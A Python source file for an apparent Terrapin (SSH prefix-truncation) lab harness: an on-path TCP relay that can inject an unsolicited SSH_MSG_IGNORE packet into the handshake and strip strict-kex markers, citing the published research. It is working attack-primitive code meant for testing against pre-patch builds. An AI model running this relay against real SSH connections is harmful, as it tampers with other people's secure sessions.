#!/usr/bin/env python3
"""
terrapin-harness relay: a transparent on-path TCP relay for SSH, with two
optional handshake-phase manipulations used to validate the lab harness
before any real truncation logic is built:

  RELAY_MODE=passthrough     -- forward every byte unmodified (baseline).
  RELAY_MODE=inject_ignore   -- additionally send one crafted, unsolicited
                                 SSH_MSG_IGNORE packet to the client right
                                 after the version-banner exchange, before
                                 any real handshake packets are relayed.
                                 This is the RcvIncrease primitive from
                                 Baeumer et al. 2024, Fig. 4a: it increases
                                 the client's receive sequence-number
                                 counter without the client or server
                                 noticing, during the still-unauthenticated
                                 part of the handshake.

  STRIP_STRICT_KEX=true      -- also strip the kex-strict-c-v00@openssh.com
                                 / kex-strict-s-v00@openssh.com markers from
                                 both peers' KEXINIT messages. NOTE: this
                                 does NOT let two patched binaries complete
                                 a handshake as if they were unpatched --
                                 KEXINIT content is covered by the exchange
                                 hash H (RFC 4253 s8), which both peers
                                 include when verifying the server's
                                 signature, so rewriting it in transit makes
                                 each side compute a different H and the
                                 handshake fails signature verification
                                 instead. This is a useful diagnostic (it
                                 empirically confirms the paper's claim,
                                 Sec. 3, that KEXINIT content -- unlike
                                 IGNORE/UNKNOWN messages -- cannot be
                                 tampered with by an on-path attacker without
                                 breaking authentication) but it is NOT a
                                 substitute for testing against a genuinely
                                 pre-patch binary. For a real pre-patch
                                 (vulnerable) target, use two peers built
                                 from targets/openssh (pinned to V_9_5_P1 by
                                 default) or an equivalent legacy build; see
                                 README.md "Local dev loop (no Docker)".

Everything after NEWKEYS has been seen in both directions is opaque
ciphertext to this relay and is spliced through raw, unparsed, using two
forwarding threads.
"""

from __future__ import annotations

import argparse
import os
import socket
import sys
import threading
from pathlib import Path

from logger import JsonlLogger
from ssh_wire import (
    ConnectionClosed,
    PlainPacket,
    SSH_MSG_KEXINIT,
    SSH_MSG_NEWKEYS,
    build_ignore_packet,
    build_plain_packet_from_payload,
    has_strict_kex_marker,
    msg_name,
    recv_exact,
    recv_plain_packet,
    recv_version_banner,
    strip_strict_kex_marker,
)

HANDSHAKE_TIMEOUT_SECONDS = 30


def raw_splice(src: socket.socket, dst: socket.socket, logger: JsonlLogger, label: str) -> None:
    """Blindly forward raw bytes from src to dst until either side closes."""
    total = 0
    try:
        while True:
            chunk = src.recv(65536)
            if not chunk:
                break
            dst.sendall(chunk)
            total += len(chunk)
    except (ConnectionError, OSError):
        pass
    finally:
        logger.log("splice_closed", direction=label, length=total)
        try:
            dst.shutdown(socket.SHUT_WR)
        except OSError:
            pass


def relay_one_direction_packet(
    src: socket.socket,
    dst: socket.socket,
    logger: JsonlLogger,
    direction: str,
    strip_strict_kex: bool,
) -> PlainPacket:
    """Read one plaintext BPP packet from src, optionally rewrite it, forward to dst."""
    pkt = recv_plain_packet(src)
    out_bytes = pkt.raw

    if strip_strict_kex and pkt.msg_type == SSH_MSG_KEXINIT:
        had_marker = has_strict_kex_marker(pkt.payload)
        if had_marker:
            new_payload = strip_strict_kex_marker(pkt.payload)
            out_bytes = build_plain_packet_from_payload(new_payload)
            logger.log(
                "kexinit_rewritten",
                direction=direction,
                note="stripped kex-strict-* marker",
            )

    logger.log(
        "packet",
        direction=direction,
        msg_type=pkt.msg_type,
        msg_name=msg_name(pkt.msg_type),
        length=len(pkt.raw),
    )
    dst.sendall(out_bytes)
    return pkt


def run_handshake_phase(
    client_sock: socket.socket,
    server_sock: socket.socket,
    logger: JsonlLogger,
    inject_ignore: bool,
    strip_strict_kex: bool,
) -> None:
    client_sock.settimeout(HANDSHAKE_TIMEOUT_SECONDS)
    server_sock.settimeout(HANDSHAKE_TIMEOUT_SECONDS)

    # --- Phase 0: version banners (plaintext, line-based, not BPP framed) ---
    client_banner = recv_version_banner(client_sock)
    logger.log("banner", direction="client_to_router", note=client_banner.decode(errors="replace").strip())
    server_sock.sendall(client_banner)

    server_banner = recv_version_banner(server_sock)
    logger.log("banner", direction="server_to_router", note=server_banner.decode(errors="replace").strip())
    client_sock.sendall(server_banner)

    # --- Phase 1a: relay the very first packet in each direction (KEXINIT) ---
    # before any injection. A patched client's very first expectation --
    # "the first packet after the version banner is my peer's KEXINIT" --
    # must be honored unconditionally (this holds even without mutual
    # strict-kex agreement, since no legitimate legacy peer violates it
    # either); only after that is satisfied does the strict-kex *mutual
    # negotiation* govern whether later out-of-order packets are tolerated.
    newkeys_seen = {"client_to_router": False, "server_to_router": False}
    pkt = relay_one_direction_packet(client_sock, server_sock, logger, "client_to_router", strip_strict_kex)
    if pkt.msg_type == SSH_MSG_NEWKEYS:
        newkeys_seen["client_to_router"] = True
    pkt = relay_one_direction_packet(server_sock, client_sock, logger, "server_to_router", strip_strict_kex)
    if pkt.msg_type == SSH_MSG_NEWKEYS:
        newkeys_seen["server_to_router"] = True

    # --- Optional injection: send a crafted IGNORE straight to the client ---
    # This packet is NOT derived from anything the server sent; it is
    # manufactured by the relay and increases the client's Rcv counter by
    # one without the server's Snd counter changing, exactly as in
    # Baeumer et al. 2024, Sec. 4.1 (RcvIncrease / Fig. 4a) and placed in
    # the handshake the way Fig. 2/5a place it: after KEXINIT, before
    # NEWKEYS.
    if inject_ignore:
        ignore_pkt = build_ignore_packet()
        client_sock.sendall(ignore_pkt)
        logger.log(
            "inject",
            direction="router_to_client",
            msg_type=2,
            msg_name="SSH_MSG_IGNORE",
            length=len(ignore_pkt),
            note="synthetic packet, not derived from relayed traffic",
        )

    # --- Phase 1b: parse + forward remaining plaintext packets until NEWKEYS seen both ways ---
    while not all(newkeys_seen.values()):
        if not newkeys_seen["client_to_router"]:
            pkt = relay_one_direction_packet(
                client_sock, server_sock, logger, "client_to_router", strip_strict_kex
            )
            if pkt.msg_type == SSH_MSG_NEWKEYS:
                newkeys_seen["client_to_router"] = True
        if not newkeys_seen["server_to_router"]:
            pkt = relay_one_direction_packet(
                server_sock, client_sock, logger, "server_to_router", strip_strict_kex
            )
            if pkt.msg_type == SSH_MSG_NEWKEYS:
                newkeys_seen["server_to_router"] = True

    logger.log("handshake_complete", note="NEWKEYS observed in both directions")


def handle_connection(
    client_sock: socket.socket,
    backend_host: str,
    backend_port: int,
    mode: str,
    strip_strict_kex: bool,
    logger: JsonlLogger,
) -> None:
    client_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    server_sock = socket.create_connection((backend_host, backend_port), timeout=10)
    server_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    logger.log("connected", note=f"backend={backend_host}:{backend_port} mode={mode} strip_strict_kex={strip_strict_kex}")

    try:
        run_handshake_phase(
            client_sock,
            server_sock,
            logger,
            inject_ignore=(mode == "inject_ignore"),
            strip_strict_kex=strip_strict_kex,
        )
    except (ConnectionClosed, ConnectionError, OSError, TimeoutError) as exc:
        logger.log("handshake_failed", note=str(exc))
        client_sock.close()
        server_sock.close()
        return

    client_sock.settimeout(None)
    server_sock.settimeout(None)

    t1 = threading.Thread(target=raw_splice, args=(client_sock, server_sock, logger, "client_to_server_raw"))
    t2 = threading.Thread(target=raw_splice, args=(server_sock, client_sock, logger, "server_to_client_raw"))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()
    logger.log("connection_closed")


def main() -> None:
    parser = argparse.ArgumentParser(description="Terrapin lab harness relay")
    parser.add_argument("--listen-host", default=os.environ.get("LISTEN_HOST", "0.0.0.0"))
    parser.add_argument("--listen-port", type=int, default=int(os.environ.get("LISTEN_PORT", "2222")))
    parser.add_argument("--backend-host", default=os.environ.get("BACKEND_HOST", "127.0.0.1"))
    parser.add_argument("--backend-port", type=int, default=int(os.environ.get("BACKEND_PORT", "22")))
    parser.add_argument(
        "--mode",
        choices=["passthrough", "inject_ignore"],
        default=os.environ.get("RELAY_MODE", "passthrough"),
    )
    parser.add_argument(
        "--strip-strict-kex",
        action="store_true",
        default=os.environ.get("STRIP_STRICT_KEX", "false").lower() == "true",
    )
    parser.add_argument("--log-file", default=os.environ.get("LOG_FILE", "/logs/relay.jsonl"))
    parser.add_argument(
        "--once",
        action="store_true",
        help="handle exactly one connection then exit (useful for scripted tests)",
    )
    args = parser.parse_args()

    logger = JsonlLogger(args.log_file)
    logger.log(
        "relay_start",
        note=f"listen={args.listen_host}:{args.listen_port} backend={args.backend_host}:{args.backend_port} "
        f"mode={args.mode} strip_strict_kex={args.strip_strict_kex}",
    )

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.listen_host, args.listen_port))
    listener.listen(5)
    print(f"[relay] listening on {args.listen_host}:{args.listen_port}, "
          f"forwarding to {args.backend_host}:{args.backend_port} (mode={args.mode})", file=sys.stderr)

    try:
        while True:
            client_sock, addr = listener.accept()
            logger.log("accept", note=f"client={addr[0]}:{addr[1]}")
            handle_connection(
                client_sock, args.backend_host, args.backend_port, args.mode, args.strip_strict_kex, logger
            )
            if args.once:
                break
    except KeyboardInterrupt:
        pass
    finally:
        listener.close()
        logger.close()


if __name__ == "__main__":
    main()
